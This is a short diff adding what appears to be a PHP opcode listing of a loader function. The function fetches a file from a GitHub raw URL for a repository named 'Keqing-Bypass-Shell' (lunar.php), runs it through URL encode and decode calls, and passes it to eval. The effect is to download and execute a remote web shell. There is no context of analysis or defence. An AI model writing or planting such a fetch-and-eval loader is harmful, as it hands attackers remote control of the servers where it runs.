@@ -1,0 +1,17 @@
+FunctionStart 
+ECHO 'null'
+INIT_FCALL 'file_get_contents'
+INIT_FCALL 'urldecode'
+INIT_FCALL 'urlencode'
+INIT_FCALL 'rawurldecode'
+INIT_FCALL 'rawurlencode'
+SEND_VAL 'https://raw.githubusercontent.com/Alexspedo168/Keqing-Bypass-Shell/refs/heads/main/lunar.php'
+DO_ICALL 
+DO_ICALL 
+DO_ICALL 
+DO_ICALL 
+DO_ICALL 
+CONCAT '?>'
+INCLUDE_OR_EVAL 'EVAL'
+RETURN 1
+FunctionEnd 
